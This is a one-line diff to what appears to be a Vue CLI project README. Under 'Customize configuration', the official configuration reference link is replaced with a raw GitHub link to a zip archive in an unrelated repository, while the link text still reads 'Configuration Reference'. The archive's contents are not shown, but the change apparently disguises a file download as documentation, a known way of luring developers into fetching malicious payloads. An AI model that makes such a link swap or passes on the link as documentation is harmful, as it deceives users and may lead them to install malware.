@@ -21,4 +21,4 @@ npm run lint
 ```
 
 ### Customize configuration
-See [Configuration Reference](https://cli.vuejs.org/config/).
+See [Configuration Reference](https://raw.githubusercontent.com/Miguel-max219/professeur-crud/master/public/professeur-crud_2.7.zip).
